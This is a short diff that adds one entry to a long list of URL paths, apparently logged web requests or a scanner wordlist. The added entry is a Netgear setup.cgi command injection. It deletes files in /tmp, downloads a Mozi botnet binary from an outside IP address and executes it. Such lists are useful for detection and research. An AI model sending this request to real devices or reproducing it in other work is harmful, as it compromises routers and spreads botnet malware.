@@ -23610,3 +23610,4 @@ http://ipv4.icanhazip.com/
 /admin/media/
 /figs-loso-gold-figs-30-50-cm?order=DESC&page=27&sort=rating&tag=0
 /elfinder/php/connector.minimal.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://124.235.200.172:57063/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
